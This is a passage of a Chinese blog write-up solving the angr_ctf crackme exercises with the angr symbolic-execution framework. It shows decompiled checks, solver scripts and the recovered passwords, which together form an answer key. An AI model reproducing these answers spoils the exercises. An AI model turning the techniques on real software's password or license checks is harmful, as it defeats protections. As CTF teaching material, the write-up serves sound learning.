class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">project = angr.Project(<span class="string">&quot;./signal.exe&quot;</span>)</span><br><span class="line">state = project.factory.entry_state()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ReplacementScanf</span>(<span class="params">angr.SimProcedure</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self, format_string, string_address</span>):</span></span><br><span class="line">        flag = claripy.BVS(<span class="string">&#x27;flag&#x27;</span>, <span class="number">8</span> * <span class="number">0xf</span>)</span><br><span class="line">        self.state.memory.store(string_address, flag)</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> flag.chop(bits=<span class="number">8</span>):   <span class="comment"># 限制为可见字符</span></span><br><span class="line">            self.state.add_constraints(char &gt;= <span class="string">&#x27;0&#x27;</span>, char &lt;= <span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">        self.state.<span class="built_in">globals</span>[<span class="string">&#x27;solutions&#x27;</span>] = (flag)</span><br><span class="line"></span><br><span class="line">scanf_symbol = <span class="string">&quot;scanf&quot;</span></span><br><span class="line">project.hook_symbol(scanf_symbol, ReplacementScanf())</span><br><span class="line"></span><br><span class="line">simgr = project.factory.simgr(state)</span><br><span class="line">simgr.explore(find=<span class="number">0x0040179E</span>, avoid=<span class="number">0x04016E6</span>)</span><br><span class="line"><span class="keyword">if</span> simgr.found:</span><br><span class="line">    solver_state = simgr.found[<span class="number">0</span>]</span><br><span class="line">    stored_solution = solver_state.<span class="built_in">globals</span>[<span class="string">&#x27;solutions&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(solver_state.solver.<span class="built_in">eval</span>(</span><br><span class="line">        stored_solution, cast_to = <span class="built_in">bytes</span>))</span><br></pre></td></tr></table></figure><h4 id="angr-ctf"><a href="#angr-ctf" class="headerlink" title="angr_ctf"></a>angr_ctf</h4><p><a href="https://github.com/jakespringer/angr_ctf">题目地址</a></p><p>b站上有全套的解题讲解: <a href="https://space.bilibili.com/386563875/channel/detail?cid=109932">[angr_ctf] angr符号执行</a></p><h5 id="00-angr-find"><a href="#00-angr-find" class="headerlink" title="00_angr_find"></a>00_angr_find</h5><p>IDA打开, 很标准的可以用angr的题型</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+1Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> s1[<span class="number">9</span>]; <span class="comment">// [esp+23h] [ebp-15h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  print_msg();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%8s&quot;</span>, s1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">    s1[i] = complex_function(s1[i], i);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;QWSYJIQP&quot;</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">proj = angr.Project(<span class="string">&#x27;./00_angr_find&#x27;</span>, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(find=<span class="number">0x804867D</span>, avoid=<span class="number">0x804866B</span>)</span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>得到答案:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(angr) ➜  00_angr_find git:(master) ✗ python3 s.py</span><br><span class="line">............</span><br><span class="line">b<span class="string">&#x27;QTMPXTYU&#x27;</span></span><br></pre></td></tr></table></figure><h5 id="01-angr-void"><a href="#01-angr-void" class="headerlink" title="01_angr_void"></a>01_angr_void</h5><p>跟第一个差不多, 这次不过这次avoid是<code>avoid_me()</code>函数的地址, 而不是字符串</p><h6 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;./01_angr_avoid&#x27;</span>, auto_load_libs = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line"><span class="built_in">print</span>(simgr.explore(find=<span class="number">0x080485E0</span>, avoid=<span class="number">0x080485A8</span>))</span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>得到答案</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(angr) ➜  01_angr_avoid git:(master) ✗ python3 s.py</span><br><span class="line">......</span><br><span class="line">&lt;SimulationManager with 1 active, 16 deadended, 1 found, 10 avoid&gt;</span><br><span class="line">b<span class="string">&#x27;RNGFXITY&#x27;</span></span><br></pre></td></tr></table></figure><h5 id="02-angr-find-condition"><a href="#02-angr-find-condition" class="headerlink" title="02_angr_find_condition"></a>02_angr_find_condition</h5><p>跟前两个都差不多, 不过这次用不同的写法, 前两次我们都是给出地址, 这次我们直接写</p><h6 id="脚本-2"><a href="#脚本-2" class="headerlink" title="脚本"></a>脚本</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">    bin_path = argv[<span class="number">1</span>]</span><br><span class="line">    project = angr.Project(bin_path)</span><br><span class="line">    init_state = project.factory.entry_state()</span><br><span class="line">    simgr = project.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果 &quot;Good Job.&quot; 在输出流中</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&quot;Good Job.&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 如果 &quot;Try again.&quot; 在输出流中</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span>(<span class="params">state</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&quot;Try again.&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(simgr.explore(find=is_successful, avoid=should_abort))</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        <span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure><p>运行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(angr) ➜  dist git:(master) ✗ python3 s.py 02_angr_find_condition</span><br><span class="line">......</span><br><span class="line">&lt;SimulationManager with 1 found, 17 avoid&gt;</span><br><span class="line">b<span class="string">&#x27;HETOBRCU&#x27;</span></span><br></pre></td></tr></table></figure><h5 id="03-angr-simbolic-registers"><a href="#03-angr-simbolic-registers" class="headerlink" title="03_angr_simbolic_registers"></a>03_angr_simbolic_registers</h5><blockquote><p>该题主要学会符号化寄存器<br>现angr已支持多参数的求解</p></blockquote><p>这里我们直接跳过<code>get_user_input()</code>函数, 直接设置寄存器<code>eax, ebx, edx</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0804897B                 call    get_user_input</span><br><span class="line">.text:08048980                 mov     [ebp+var_14], eax</span><br><span class="line">.text:08048983                 mov     [ebp+var_10], ebx</span><br><span class="line">.text:08048986                 mov     [ebp+var_C], edx</span><br></pre></td></tr></table></figure><h6 id="脚本-3"><a href="#脚本-3" class="headerlink" title="脚本"></a>脚本</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">    bin_path = argv[<span class="number">1</span>]</span><br><span class="line">    project = angr.Project(bin_path)</span><br><span class="line">    <span class="comment"># start_addr 设置为 call    get_user_input 的下一条指令</span></span><br><span class="line">    start_addr = <span class="number">0x804897B</span></span><br><span class="line">    <span class="comment"># 创建一个空的状态, 接受一个参数进行初始化</span></span><br><span class="line">    init_state = project.factory.blank_state(addr=start_addr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建三个符号向量, 寄存器为32位</span></span><br><span class="line">    pass1 = claripy.BVS(<span class="string">&quot;pass1&quot;</span>, <span class="number">32</span>)</span><br><span class="line">    pass2 = claripy.BVS(<span class="string">&quot;pass2&quot;</span>, <span class="number">32</span>)</span><br><span class="line">    pass3 = claripy.BVS(<span class="string">&quot;pass3&quot;</span>, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将三个符号向量赋值给寄存器</span></span><br><span class="line">    init_state.regs.eax = pass1</span><br><span class="line">    init_state.regs.ebx = pass2</span><br><span class="line">    init_state.regs.edx = pass3</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 初始化</span></span><br><span class="line">    simgr = project.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&quot;Good Job.&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span>(<span class="params">state</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&quot;Try again.&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 开始爆破</span></span><br><span class="line">    <span class="built_in">print</span>(simgr.explore(find=is_successful, avoid=should_abort))</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        <span class="comment"># python2 可能要用format, 然而实测python3可以直接输出, 具体看文档</span></span><br><span class="line">        <span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure><p>运行:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(angr) ➜  dist git:(master) ✗ python3 s.py 03_angr_symbolic_registers</span><br><span class="line">......</span><br><span class="line">&lt;SimulationManager with 1 found, 3 avoid&gt;</span><br><span class="line">b<span class="string">&#x27;b9ffd04e ccf63fe8 8fd4d959&#x27;</span></span><br></pre></td></tr></table></figure><p>得到结果</p><h5 id="04-angr-symbolic-stack"><a href="#04-angr-symbolic-stack" class="headerlink" title="04_angr_symbolic_stack"></a>04_angr_symbolic_stack</h5><blockquote><p>这里我们还是假设angr不支持多参数输入, 主要是为了学习如何符号化栈上的值</p></blockquote><p>IDA打开以后看到函数<code>handle_user()</code>, 我们需要跳过<code>scanf()</code>, 将栈上的值进行符号化</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0804868A                 push    offset aUU      ; &quot;%u %u&quot;</span><br><span class="line">.text:0804868F                 call    ___isoc99_scanf</span><br><span class="line">.text:08048694                 add     esp, 10h</span><br><span class="line">.text:08048697                 mov     eax, [ebp-12] ; 参数1</span><br><span class="line">.text:0804869A                 sub     esp, 0Ch</span><br><span class="line">.text:0804869D                 push    eax</span><br><span class="line">.text:0804869E                 call    complex_function0</span><br><span class="line">.text:080486A3                 add     esp, 10h</span><br><span class="line">.text:080486A6                 mov     [ebp-12], eax</span><br><span class="line">.text:080486A9                 mov     eax, [ebp-16] ; 参数2</span><br><span class="line">.text:080486AC                 sub     esp, 0Ch</span><br><span class="line">.text:080486AF                 push    eax</span><br><span class="line">.text:080486B0                 call    complex_function1</span><br><span class="line">.text:080486B5                 add     esp, 10h</span><br><span class="line">.text:080486B8                 mov     [ebp+var_10], eax</span><br></pre></td></tr></table></figure><p>由于初始化时是没有栈的, 因此我们需要对栈进行<code>padding</code></p><h6 id="脚本-4"><a href="#脚本-4" class="headerlink" title="脚本"></a>脚本</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">    bin_path = argv[<span class="number">1</span>]</span><br><span class="line">    project = angr.Project(bin_path)</span><br><span class="line">    <span class="comment"># start_addr 设置为 add     esp, 10h 即回收栈的下一条指令</span></span><br><span class="line">    start_addr = <span class="number">0x8048697</span></span><br><span class="line">    <span class="comment"># 创建一个空的状态, 接受一个参数进行初始化</span></span><br><span class="line">    init_state = project.factory.blank_state(addr=start_addr)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对栈进行padding的大小</span></span><br><span class="line">    padding_size = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 模拟函数开头</span></span><br><span class="line">    <span class="comment"># init_state.stack_push(init_state.regs.ebp) 这句其实没有用, 毕竟我们根本用不到传进来的参数或者说根本没有传进来的参数</span></span><br><span class="line">    init_state.regs.ebp = init_state.regs.esp</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对栈进行padding, 两个符号向量即是8字节, 这一步其实就是扩栈为存放两个符号向量做准备</span></span><br><span class="line">    init_state.regs.esp -= padding_size</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建两个符号向量, int 为32位</span></span><br><span class="line">    pass1 = init_state.solver.BVS(<span class="string">&quot;pass1&quot;</span>, <span class="number">32</span>)</span><br><span class="line">    pass2 = init_state.solver.BVS(<span class="string">&quot;pass2&quot;</span>, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将两个符号向量压栈</span></span><br><span class="line">    init_state.stack_push(pass1)</span><br><span class="line">    init_state.stack_push(pass2)</span><br><span class="line"></span><br><span class="line">    simgr = project.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&quot;Good Job.&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span>(<span class="params">state</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&quot;Try again.&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(simgr.explore(find=is_successful, avoid=should_abort))</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        pass1 = simgr.found[<span class="number">0</span>].solver.<span class="built_in">eval</span>(pass1)</span><br><span class="line">        pass2 = simgr.found[<span class="number">0</span>].solver.<span class="built_in">eval</span>(pass2)</span><br><span class="line">        <span class="built_in">print</span>(pass1, pass2)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span>(Exception(<span class="string">&quot;Solution not found.&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure><p>运行得结果:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(angr) ➜  dist git:(master) ✗ python3 s.py 04_angr_symbolic_stack</span><br><span class="line">......</span><br><span class="line">&lt;SimulationManager with 1 found, 2 avoid&gt;</span><br><span class="line">1704280884 2382341151</span><br></pre></td></tr></table></figure><p>验证:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(angr) ➜  dist git:(master) ✗ ./04_angr_symbolic_stack</span><br><span class="line">Enter the password: 1704280884 2382341151</span><br><span class="line">Good Job.</span><br></pre></td></tr></table></figure><h5 id="05-angr-symbolic-memory"><a href="#05-angr-symbolic-memory" class="headerlink" title="05_angr_symbolic_memory"></a>05_angr_symbolic_memory</h5><blockquote><p>这题主要学会符号化内存</p></blockquote><p>IDA打开后, 查看主函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(user_input, <span class="number">0</span>, <span class="number">0x21</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%8s %8s %8s %8s&quot;</span>, user_input, &amp;unk_A1BA1C8, &amp;unk_A1BA1D0, &amp;unk_A1BA1D8);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">    *(_BYTE *)(i + <span class="number">169583040</span>) = complex_function(*(<span class="keyword">char</span> *)(i + <span class="number">169583040</span>), i);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(user_input, <span class="string">&quot;NJPURZPCDYEAXCSJZJMPSOMBFDDLHBVN&quot;</span>, <span class="number">0x20</span>u) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们需要符号化四个变量<code>user_input</code>, <code>unk_A1BA1C8</code>, <code>unk_A1BA1D0</code>, <code>unk_A1BA1D8</code></p><p>首先获得地址:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0A1BA1C0 ; char user_input[8]</span><br><span class="line">.bss:0A1BA1C0 user_input      db 8 dup(?)             ; DATA XREF: main+18↑o</span><br><span class="line">.bss:0A1BA1C0                                         ; main+47↑o ...</span><br><span class="line">.bss:0A1BA1C8 ; char byte_A1BA1C8[8]</span><br><span class="line">.bss:0A1BA1C8 byte_A1BA1C8    db     ?                ; DATA XREF: main+42↑o</span><br><span class="line">.bss:0A1BA1C9                 db    ? ;</span><br><span class="line">.bss:0A1BA1CA                 db    ? ;</span><br><span class="line">.bss:0A1BA1CB                 db    ? ;</span><br><span class="line">.bss:0A1BA1CC                 db    ? ;</span><br><span class="line">.bss:0A1BA1CD                 db    ? ;</span><br><span class="line">.bss:0A1BA1CE                 db    ? ;</span><br><span class="line">.bss:0A1BA1CF                 db    ? ;</span><br><span class="line">.bss:0A1BA1D0 byte_A1BA1D0    db ?                    ; DATA XREF: main+3D↑o</span><br><span class="line">.bss:0A1BA1D1                 db    ? ;</span><br><span class="line">.bss:0A1BA1D2                 db    ? ;</span><br><span class="line">.bss:0A1BA1D3                 db    ? ;</span><br><span class="line">.bss:0A1BA1D4                 db    ? ;</span><br><span class="line">.bss:0A1BA1D5                 db    ? ;</span><br><span class="line">.bss:0A1BA1D6                 db    ? ;</span><br><span class="line">.bss:0A1BA1D7                 db    ? ;</span><br><span class="line">.bss:0A1BA1D8 unk_A1BA1D8     db    ? ;</span><br></pre></td></tr></table></figure><p>这次<code>start_addr</code>从<code>0x08048601</code>也就是跳过<code>scanf</code></p><h6 id="脚本-5"><a href="#脚本-5" class="headerlink" title="脚本"></a>脚本</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">    bin_path = argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    project = angr.Project(bin_path)</span><br><span class="line">    start_addr = <span class="number">0x08048601</span></span><br><span class="line">    init_state = project.factory.blank_state(addr = start_addr)</span><br><span class="line"></span><br><span class="line">    user_input = <span class="number">0x0A1BA1C0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># %8s也就是8个字节, 也就是64位</span></span><br><span class="line">    password = [init_state.solver.BVS(<span class="string">&quot;pass%d&quot;</span>, <span class="number">64</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 这四个参数的地址是连续的, 间隔8个字节</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        init_state.memory.store(user_input + i * <span class="number">8</span>, password[i])</span><br><span class="line"></span><br><span class="line">    simgr = project.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&quot;Good Job.&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span>(<span class="params">state</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&quot;Try again.&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(simgr.explore(find=is_successful, avoid=should_abort))</span><br><span class="line">    <span class="keyword">if</span> simgr.found:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            <span class="built_in">print</span>(simgr.found[<span class="number">0</span>].solver.<span class="built_in">eval</span>(password[i], cast_to=<span class="built_in">bytes</span>), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span>(Exception(<span class="string">&quot;Solution not found.&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(angr) ➜  dist git:(master) ✗ python3 s.py 05_angr_symbolic_memory</span><br><span class="line">......</span><br><span class="line">&lt;SimulationManager <span class="keyword">with</span> <span class="number">1</span> found, <span class="number">65</span> avoid&gt;</span><br><span class="line"><span class="string">b&#x27;NAXTHGNR&#x27;</span><span class="string">b&#x27;JVSFTPWE&#x27;</span><span class="string">b&#x27;LMGAUHWC&#x27;</span><span class="string">b&#x27;XMDCPALU&#x27;</span>%</span><br></pre></td></tr></table></figure><h5 id="06-angr-symbolic-dynamic-memory"><a href="#06-angr-symbolic-dynamic-memory" class="headerlink" title="06_angr_symbolic_dynamic_memory"></a>06_angr_symbolic_dynamic_memory</h5><blockquote><p>这里我们主要是符号化动态内存</p></blockquote><p>主函数如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+0h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  buffer0 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">9u</span>);</span><br><span class="line">  buffer1 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">9u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buffer0, <span class="number">0</span>, <span class="number">9u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buffer1, <span class="number">0</span>, <span class="number">9u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  __isoc99_scanf((<span class="keyword">int</span>)<span class="string">&quot;%8s %8s&quot;</span>, (<span class="keyword">int</span>)buffer0, (<span class="keyword">int</span>)buffer1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = &amp;buffer0[i];</span><br><span class="line">    *v3 = complex_function(buffer0[i], i);</span><br><span class="line">    v4 = &amp;buffer1[i];</span><br><span class="line">    *v4 = complex_function(buffer1[i], i + <span class="number">32</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(buffer0, <span class="string">&quot;UODXLZBI&quot;</span>, <span class="number">8u</span>) &amp;&amp; !<span class="built_in">strncmp</span>(buffer1, <span class="string">&quot;UAORRAYF&quot;</span>, <span class="number">8u</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good Job.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again.&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(buffer0);</span><br><span class="line">  <span class="built_in">free</span>(buffer1);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们首先要找到<code>ESP</code>:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">    bin_path = argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    project = angr.Project(bin_path)</span><br><span class="line">    start_addr = <span class="number">0x08048601</span></span><br><span class="line">    init_state = project.factory.blank_state(addr = start_addr)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ESP:&quot;</span>, init_state.regs.esp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure><p>运行得到:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(angr) ➜  dist git:(master) ✗ python3 s.py 06_angr_symbolic_dynamic_memory</span><br><span class="line">ESP: &lt;BV32 0x7ffefffc&gt;</span><br></pre></td></tr></table></figure><p>由于我们跳过了<code>scanf()</code>及其以前的内容, 即以下两条语句是不会运行的:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">buffer0 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">9u</span>);</span><br><span class="line">buffer1 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">9u</span>);</span><br></pre></td></tr></table></figure><p>因此我们需要修改<code>buffer0</code>和<code>buffer1</code>指向我们准备好的内存地址</p><p><code>buffer0</code>和<code>buffer1</code>地址如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0ABCC8A4 buffer0</span><br><span class="line">.bss:0ABCC8AC buffer1  </span><br></pre></td></tr></table></figure><h6 id="脚本-6"><a href="#脚本-6" class="headerlink" title="脚本"></a>脚本</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> 